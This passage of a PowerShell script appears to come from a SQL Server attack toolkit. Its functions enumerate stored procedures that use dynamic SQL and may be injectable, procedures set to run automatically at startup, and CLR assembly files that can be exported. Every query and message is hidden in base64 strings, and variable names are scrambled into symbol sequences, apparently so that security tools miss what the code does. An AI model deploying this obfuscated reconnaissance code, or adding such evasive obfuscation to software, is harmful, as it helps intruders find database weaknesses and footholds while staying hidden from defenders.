AAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAZQB4AGUAYwB1AHQAZQAoACUAJwAgAE8AUgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAJwAnACcAJwAnACcAKwAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlACcAJwAnACcAJwAnACAAKwAlACcAKQAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEEATgBEACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlACsAJQAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEEATgBEACAAUgBPAFUAVABJAE4ARQBfAEMAQQBUAEEATABPAEcAIABuAG8AdAAgAGwAaQBrAGUAIAAnAG0AcwBkAGIAJwAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAC8APQBcAF8AXwBfAF8AXwAvAFwALwA9AFwAXwAvAD0AfQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AFwAXwBfAF8AXwAvAD0AXAAvAD0APQA9AD0AXABfAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQA9AFwALwA9AD0APQBcAF8AXwAvAFwALwBcAC8AXAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8AUgBEAEUAUgAgAEIAWQAgAFIATwBVAFQASQBOAEUAXwBOAEEATQBFAA==')))
            if($OnlySigned){
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAHUAcwBlACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHAAcgAuAFIATwBVAFQASQBOAEUAXwBDAEEAVABBAEwATwBHACAAYQBzACAARABCAF8ATgBBAE0ARQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAcAByAC4AUwBQAEUAQwBJAEYASQBDAF8AUwBDAEgARQBNAEEAIABhAHMAIABTAEMASABFAE0AQQBfAE4AQQBNAEUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHAAcgAuAFIATwBVAFQASQBOAEUAXwBOAEEATQBFACAAYQBzACAAUwBQAF8ATgBBAE0ARQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAcAByAC4AUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABhAHMAIABTAFAAXwBDAE8ARABFACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBBAFMARQAgAGMAcAAuAGMAcgB5AHAAdABfAHQAeQBwAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBoAGUAbgAgACcAUwBQAFYAQwAnACAAdABoAGUAbgAgAGMAZQByAC4AbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGgAZQBuACAAJwBDAFAAVgBDACcAIAB0AGgAZQBuACAAQwBlAHIALgBuAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHcAaABlAG4AIAAnAFMAUABWAEEAJwAgAHQAaABlAG4AIABhAGsALgBuAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHcAaABlAG4AIAAnAEMAUABWAEEAJwAgAHQAaABlAG4AIABhAGsALgBuAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATgBEACAAYQBzACAAQwBFAFIAVABfAE4AQQBNAEUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHAALgBuAGEAbQBlACAAYQBzACAAQwBFAFIAVABfAEwATwBHAEkATgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAcAAuAHMAaQBkACAAYQBzACAAQwBFAFIAVABfAFMASQBEAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIABzAHkAcwAuAGMAcgB5AHAAdABfAHAAcgBvAHAAZQByAHQAaQBlAHMAIABjAHAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASgBPAEkATgAgAHMAeQBzAC4AbwBiAGoAZQBjAHQAcwAgAG8AIABPAE4AIABjAHAALgBtAGEAagBvAHIAXwBpAGQAIAA9ACAAbwAuAG8AYgBqAGUAYwB0AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEwARQBGAFQAIABKAE8ASQBOACAAcwB5AHMALgBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgAGMAZQByACAATwBOACAAYwBwAC4AdABoAHUAbQBiAHAAcgBpAG4AdAAgAD0AIABjAGUAcgAuAHQAaAB1AG0AYgBwAHIAaQBuAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATABFAEYAVAAgAEoATwBJAE4AIABzAHkAcwAuAGEAcwB5AG0AbQBlAHQAcgBpAGMAXwBrAGUAeQBzACAAYQBrACAATwBOACAAYwBwAC4AdABoAHUAbQBiAHAAcgBpAG4AdAAgAD0AIABhAGsALgB0AGgAdQBtAGIAcAByAGkAbgB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEwARQBGAFQAIABKAE8ASQBOACAASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AUwBDAEgARQBNAEEALgBSAE8AVQBUAEkATgBFAFMAIABzAHAAcgAgAG8AbgAgAHMAcAByAC4AUgBPAFUAVABJAE4ARQBfAE4AQQBNAEUAIAA9ACAAbwAuAG4AYQBtAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATABFAEYAVAAgAEoATwBJAE4AIABzAHkAcwAuAHMAZQByAHYAZQByAF8AcAByAGkAbgBjAGkAcABhAGwAcwAgAHMAcAAgAG8AbgAgAHMAcAAuAHMAaQBkACAAPQAgAGMAZQByAC4AcwBpAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBIAEUAUgBFACAAbwAuAHQAeQBwAGUAXwBkAGUAcwBjACAAPQAgACcAUwBRAEwAXwBTAFQATwBSAEUARABfAFAAUgBPAEMARQBEAFUAUgBFACcAQQBOAEQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAcwBwAF8AZQB4AGUAYwB1AHQAZQBzAHEAbAAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlAHMAcABfAHMAcQBsAGUAeABlAGMAJQAnACAATwBSAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQBlAHgAZQBjACAAQAAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlAGUAeABlAGMAIAAoACUAJwAgAE8AUgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAZQB4AGUAYwAoACUAJwAgAE8AUgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAZQB4AGUAYwB1AHQAZQAgAEAAJQAnACAATwBSAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQBlAHgAZQBjAHUAdABlACAAKAAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlAGUAeABlAGMAdQB0AGUAKAAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlACcAJwAnACcAJwAnACsAJQAnACAATwBSAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQAnACcAJwAnACcAJwAgACsAJQAnACkAIABBAE4ARAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8AQwBBAFQAQQBMAE8ARwAgAG4AbwB0ACAAbABpAGsAZQAgACcAbQBzAGQAYgAnACAAQQBOAEQAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAKwAlACcA')))
            }
            ${____/=\_____/==\/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/==\__/=\/\___/\/} = ${____/=\_____/==\/}.rows.count
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQBcAF8AXwAvAD0AXAAvAFwAXwBfAF8ALwBcAC8AfQAgAGYAbwB1AG4AZAAgAGkAbgAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAgAGQAYQB0AGEAYgBhAHMAZQA=')))
            ${_/\/\__/===\/\/\_} = ${_/\/\__/===\/\/\_} + ${____/=\_____/==\/}
        }
    }
    End
    {
        ${_/\/\__/===\/\/\_}
    }
}
Function  Get-SQLStoredProcedureAutoExec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/\__/===\/\/\_} = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            ${/=\____/=\/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFIATwBVAFQASQBOAEUAXwBOAEEATQBFACAAbABpAGsAZQAgACcAJABQAHIAbwBjAGUAZAB1AHIAZQBOAGEAbQBlACcA')))
        }
        else
        {
            ${/=\____/=\/====\_} = ''
        }
        if ($Keyword)
        {
            ${/==\/===\__/\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQAkAEsAZQB5AHcAbwByAGQAJQAnAA==')))
        }
        else
        {
            ${/==\/===\__/\/\/\} = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAHUAdABvAGUAeABlAGMAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMALgAuAC4A')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAHUAcwBlACAAWwBtAGEAcwB0AGUAcgBdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBDAEEAVABBAEwATwBHACAAQQBTACAAWwBEAGEAdABhAGIAYQBzAGUATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAFMAQwBIAEUATQBBACAAQQBTACAAWwBTAGMAaABlAG0AYQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ATgBBAE0ARQAgAGEAcwAgAFsAUAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAFQAWQBQAEUAIABhAHMAIABbAFAAcgBvAGMAZQBkAHUAcgBlAFQAeQBwAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAYQBzACAAWwBQAHIAbwBjAGUAZAB1AHIAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAFEATABfAEQAQQBUAEEAXwBBAEMAQwBFAFMAUwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBCAE8ARABZACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBSAEUAQQBUAEUARAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEwAQQBTAFQAXwBBAEwAVABFAFIARQBEACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGkAcwBfAG0AcwBfAHMAaABpAHAAcABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAC4AaQBzAF8AYQB1AHQAbwBfAGUAeABlAGMAdQB0AGUAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwBJAE4ARgBPAFIATQBBAFQASQBPAE4AXwBTAEMASABFAE0AQQBdAC4AWwBSAE8AVQBUAEkATgBFAFMAXQAgAGEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASgBPAEkATgAgAFsAcwB5AHMAXQAuAFsAcAByAG8AYwBlAGQAdQByAGUAcwBdACAAIABiAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAGEALgBSAE8AVQBUAEkATgBFAF8ATgBBAE0ARQAgAD0AIABiAC4AbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBSAEUAIAAxAD0AMQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAE4ARAAgAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQAIAA9ACAAMQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AFwAXwBfAF8AXwAvAD0AXAAvAD0APQA9AD0AXABfAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQA9AFwALwA9AD0APQBcAF8AXwAvAFwALwBcAC8AXAB9AA==')))
            ${____/=\_____/==\/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            if(-not ${____/=\_____/==\/}){
            }
            ${_/\/\__/===\/\/\_} = ${_/\/\__/===\/\/\_} + ${____/=\_____/==\/}
        }
    }
    End
    {
        ${_/\/\__/===\/\/\_}
    }
}
Function  Get-SQLAssemblyFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$AssemblyName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$ExportFolder,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/==\_____/==\_/\/} = New-Object -TypeName System.Data.DataTable
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AaQBkAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AbgBhAG0AZQA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAGkAZAA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAG4AYQBtAGUA'))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBsAHIAXwBuAGEAbQBlAA=='))))        
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AdABlAG4AdAA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABlAHIAbQBpAHMAcwBpAG8AbgBfAHMAZQB0AF8AZABlAHMAYwA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBkAGEAdABlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AdQBzAGUAcgBfAGQAZQBmAGkAbgBlAGQA'))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        if($AssemblyName){
            ${/=\_/==\__/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBIAEUAUgBFACAAYQBmAC4AbgBhAG0AZQAgAEwASQBLAEUAIAAnACUAJABBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAlACcA')))
        }else{
            ${/=\_/==\__/====\_} = ""
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAYQBzAHMAZQBtAGIAbAB5ACAAZgBpAGwAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0ALgA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIAAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAEUATABFAEMAVAAgAGEAZgAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAAsAA0ACgAgAAkACQAJAAkACQAgACAAYQAuAG4AYQBtAGUAIABhAHMAIABhAHMAcwBlAG0AYgBsAHkAXwBuAGEAbQBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBmAC4AZgBpAGwAZQBfAGkAZAAsAAkACQAJAAkACQAgACAACQANAAoACQAJAAkACQAJACAAIABhAGYALgBuAGEAbQBlACAAYQBzACAAZgBpAGwAZQBfAG4AYQBtAGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AYwBsAHIAXwBuAGEAbQBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBmAC4AYwBvAG4AdABlAG4AdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAHAAZQByAG0AaQBzAHMAaQBvAG4AXwBzAGUAdABfAGQAZQBzAGMALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAG0AbwBkAGkAZgB5AF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBpAHMAXwB1AHMAZQByAF8AZABlAGYAaQBuAGUAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAcwB5AHMALgBhAHMAcwBlAG0AYgBsAGkAZQBzACAAYQAgAEkATgBOAEUAUgAgAEoATwBJAE4AIABzAHkAcwAuAGEAcwBzAGUAbQBiAGwAeQBfAGYAaQBsAGUAcwAgAGEAZgAgAE8ATgAgAGEALgBhAHMAcwBlAG0AYgBsAHkAXwBpAGQAIAA9ACAAYQBmAC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwA9AD0APQA9AFwAXwB9AA==')))
